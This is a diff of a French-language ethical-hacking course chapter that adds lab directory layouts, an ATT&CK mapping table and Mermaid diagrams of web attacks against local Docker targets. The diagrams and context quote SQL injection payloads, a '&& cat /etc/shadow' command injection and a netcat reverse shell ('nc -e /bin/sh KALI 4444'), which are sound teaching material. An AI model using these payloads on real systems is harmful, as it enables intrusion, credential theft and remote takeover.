@@ -45,8 +45,6 @@ sudo usermod -aG docker $USER  # -aG = append to Group (préserve les groupes ex
 ```bash
 # Création de l'arborescence de travail pour les 5 jours de cours + hors-série (-p = crée les parents si absents)
 mkdir -p ~/cours-hacking/labs/{jour-01,jour-02,jour-03,jour-04,jour-05} ~/cours-hacking/extra
-# Création des dossiers pour chaque jour (brace expansion)
-mkdir -p ~/cours-hacking/labs/jour-{1,2,3,4,5}
 # cd (change directory) = se déplacer dans le dossier spécifié ; ~/ = raccourci vers le home directory
 cd ~/cours-hacking
 # git clone = télécharge une copie complète du dépôt Git distant dans le dossier 'repo'
@@ -57,25 +55,44 @@ Une fois le dépôt cloné, votre arborescence de travail est la suivante :
 
 ```text
 ~/cours-hacking/
-├── labs/
-│   ├── jour-01/            # Travaux pratiques J1
-│   ├── jour-02/            # Travaux pratiques J2
-│   ├── jour-03/            # Travaux pratiques J3
-│   ├── jour-04/            # Travaux pratiques J4
-│   └── jour-05/            # Travaux pratiques J5
-├── extra/                 # Projets complémentaires
-└── repo/                  # Dépôt du cours (ce répertoire)
-    ├── JOUR-01*.md        # Supports de cours
+├── labs/                    # VOTRE espace de travail
+│   ├── jour-01/             # → Vous travaillez ici pour le J1
+│   ├── jour-02/             # → Vous travaillez ici pour le J2
+│   ├── jour-03/             # → Vous travaillez ici pour le J3
+│   ├── jour-04/             # → Vous travaillez ici pour le J4
+│   └── jour-05/             # → Vous travaillez ici pour le J5
+├── extra/                   # Projets complémentaires
+└── repo/                    # Dépôt du cours (ce répertoire)
+    ├── labs_resolution/     # 🔥 Labs RÉSOLUS (correction, référence)
+    │   ├── jour-01/         #   Scripts XSS, SQLi, CMDi résolus
+    │   ├── jour-02/         #   Scan nmap, exploits vsftpd/Samba
+    │   ├── jour-03/         #   Exploit BOF + WAF bypass
+    │   ├── jour-04/         #   Hardening + config ELK
+    │   └── jour-05/         #   Forensique + générateur rapport
+    ├── labs/                # 📁 Dossiers vides (structure de référence)
+    │   ├── jour-01/
+    │   ├── jour-02/
+    │   ├── jour-03/
+    │   ├── jour-04/
+    │   └── jour-05/
+    ├── env.sh               # Variables d'environnement centralisées
+    ├── JOUR-01*.md          # Supports de cours
     ├── JOUR-02*.md
     ├── JOUR-03*.md
     ├── JOUR-04*.md
     ├── JOUR-05*.md
     ├── HORS-SERIE-AGENTIC.md
-    ├── docker-compose.yml # Conteneurs cibles
-    ├── docker/            # Dockerfiles par lab
-    └── extra/             # Projets complémentaires (Docker, scripts)
-        └── hors-serie/    # Code source KillChainAgent
+    ├── docker-compose.yml   # Conteneurs cibles
+    ├── docker/              # Dockerfiles par lab
+    └── extra/               # Projets complémentaires (Docker, scripts)
+        └── hors-serie/      # Code source KillChainAgent
 ```
+
+> **Différence clé :**
+> - `~/cours-hacking/labs/jour-0X/` = votre dossier de travail (vide au départ, vous y créez vos scripts)
+> - `repo/labs_resolution/jour-0X/` = les solutions complètes (pour vérifier, comparer, ou vous débloquer)
+> - `repo/labs/jour-0X/` = dossiers vides dans le repo (structure de référence uniquement)
+> - Sourcez `env.sh` depuis la racine du repo pour charger les IP/ports des conteneurs dans votre shell
 
 ## A.3 Lancement des conteneurs
 
@@ -293,6 +310,16 @@ admin' OR '1'='1' --
 ' UNION SELECT username, password FROM users --
 ```
 
+```mermaid
+flowchart LR
+    A["Attaquant"] -->|"id=1' UNION SELECT user,pass FROM users--"| B["App PHP"]
+    B -->|"Requête SQL concaténée"| C["MySQL"]
+    C -->|"Résultat UNION : users + credentials"| B
+    B -->|"Affiche les credentials"| A
+```
+
+**Fig 5b** — Injection SQL de type UNION : l'attaquant concatène une seconde requête `SELECT` via `UNION` pour extraire la table `users` (identifiants) en plus des résultats normaux.
+
 ### Command Injection → [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell
 
 **Contexte métier :** 30% des applications qui exécutent des commandes système sont vulnérables. Un `ping` mal sécurisé donne un shell complet sur le serveur.
@@ -307,6 +334,15 @@ admin' OR '1'='1' --
 # Opérateur && exécute cat seulement si le ping réussit (code retour 0)
 && cat /etc/shadow
 ```
+
+```mermaid
+flowchart LR
+    A["Attaquant"] -->|"; nc -e /bin/sh KALI 4444"| B["App vulnérable<br/>system(ping + input)"]
+    B -->|"shell reverse"| C["Kali écoute :4444"]
+    C -->|"Shell distant"| D["Commande post-exploitation<br/>id · whoami · ls /etc"]
+```
+
+**Fig 5c** — Chaîne d'attaque Command Injection vers reverse shell : l'injection de `; nc -e /bin/sh <KALI> 4444` transforme un `ping` non sécurisé en shell distant exploitable.
 
 ---
 
@@ -963,6 +999,18 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 
 **Fonctionnement :** Hydra essaie des couples `login:password` contre un service (HTTP, SSH, FTP...) jusqu'à trouver une correspondance. Le taux de réussite dépend de la qualité de la wordlist.
 
+```mermaid
+flowchart LR
+    A["Hydra"] -->|"admin:password1"| B["DVWA Login"]
+    A -->|"admin:password2"| B
+    A -->|"..."| B
+    A -->|"admin:password"| B
+    B -->|"302 → Login Success"| A
+    A -->|"Trouvé : admin:password"| C["Rapport"]
+```
+
+**Fig 5d** — Attaque par force brute avec Hydra : itération de couples login:password depuis une wordlist jusqu'à obtenir un `302 Found` (connexion réussie) sur DVWA.
+
 ### Prérequis
 
 ```bash
@@ -1180,4 +1228,92 @@ Ce chapitre vous a fait parcourir les **6 phases d'une attaque web complète**, 
 
 ---
 
+## Plan du cours — Vue d'ensemble
 
+```mermaid
+flowchart TB
+    J1["JOUR-01<br/>Introduction<br/>XSS · CSRF · SQLi · CMDi · Brute-force"] --> J2["JOUR-02<br/>Pentest<br/>vsftpd · Samba · MITM · Nessus"]
+    J2 --> J3["JOUR-03<br/>Contournement<br/>BOF · WAF Bypass · Trojan"]
+    J3 --> J4["JOUR-04<br/>Contre-mesures<br/>Hardening · ELK SOC"]
+    J4 --> J5["JOUR-05<br/>Reporting<br/>Forensique · Génération rapport"]
+```
+
+**Fig 6** — Plan du cours en 5 jours : chaque jour s'appuie sur les acquis du précédent, de l'initiation (J1) au reporting professionnel (J5).
+
+## Rapport — Petit cours de synthèse
+
+### Architecture du dépôt
+
+```
+techniques-de-hacking-niveau-1/
+├── labs/                  # VIDE — votre dossier de travail
+│   └── jour-0X/           # Créez vos scripts ici
+├── labs_resolution/       # CORRIGÉS — solutions complètes
+│   └── jour-0X/labs/      # Scripts, scans, exploits résolus
+├── JOUR-0X-*.md           # Supports de cours (5 jours)
+├── env.sh                 # Variables d'environnement (sourcer avant les labs)
+├── docker-compose.yml     # Orchestration des 7 conteneurs
+└── docker/                # Dockerfiles de chaque conteneur
+```
+
+### Correspondance lab → technique ATT&CK
+
+| Lab | Technologie | ATT&CK |
+|-----|-------------|--------|
+| 1.1 Scan | DVWA | T1046 Network Scanning |
+| 1.2 XSS | DVWA | T1189 Drive-by Compromise |
+| 1.3 SQLi | DVWA + sqli-app | T1190 Exploit Public App |
+| 1.4 CMDi | DVWA | T1059.004 Unix Shell |
+| 1.5 SQLi avancée | sqli-app | T1190 + T1110.001 Password Cracking |
+| 1.6 Brute-force | DVWA | T1110 Brute Force |
+| 2.1 Recon | Metasploitable | T1046 + T1595 |
+| 2.2 vsftpd | Metasploitable | T1190 CVE-2011-2523 |
+| 2.3 Samba | Metasploitable | T1210 CVE-2007-2447 |
+| 2.4 Persistance | Metasploitable | T1098.004 SSH Key |
+| 2.5 MITM | DVWA | T1557.002 ARP Poisoning |
+| 2.6 Nessus | Metasploitable | T1046 + T1595 |
+| 3.1 BOF | buffovf-target | T1068 Privilege Escalation |
+| 3.2 WAF | waf-target | T1562.001 Impair Defenses |
+| 3.4 Trojan | Windows 10 | T1204.002 + T1071.001 |
+| 4.1 Hardening | secure-linux | M1051 + M1018 + M1037 + M1036 |
+| 4.2 ELK | Tous | Détection SOC |
+| 5.1 Forensique | forensic-victim | T1190 → T1059 → T1505 → T1548 |
+| 5.2 Rapport | local | Générateur Python |
+
+### Schémas ajoutés dans ce document
+
+| Fig | Technique | Description |
+|-----|-----------|------------|
+| Fig 1 | Topologie | 7 conteneurs cibles |
+| Fig 2 | MITRE ATT&CK | Chaîne des 14 tactiques |
+| Fig 3 | Mapping | Attaques → techniques |
+| Fig 4 | Profils | Types de hackers |
+| Fig 5 | XSS | Flux XSS réfléchie |
+| Fig 5b | SQLi UNION | Injection UNION |
+| Fig 5c | CMDi | Command → Reverse shell |
+| Fig 5d | Brute-force | Hydra en boucle |
+| Fig 6 | Plan | Vue d'ensemble 5 jours |
+
+### Où trouver les corrigés ?
+
+```bash
+# Les scripts résolus se trouvent dans labs_resolution/
+ls ~/cours-hacking/repo/labs_resolution/jour-01/labs/
+# Exemple : copier le corrigé du lab XSS dans votre dossier de travail
+cp ~/cours-hacking/repo/labs_resolution/jour-01/labs/lab_xss.sh ~/cours-hacking/labs/jour-01/
+```
+
+### Avant chaque lab
+
+```bash
+# 1. Charger les variables d'environnement
+cd ~/cours-hacking/repo && source env.sh
+# 2. Démarrer les conteneurs nécessaires
+docker compose up -d --build <conteneur>
+# 3. Vérifier que le service répond
+nc -z localhost <PORT> && echo "Prêt"
+# 4. Travailler dans votre dossier
+cd ~/cours-hacking/labs/jour-0X
+```
+
+---
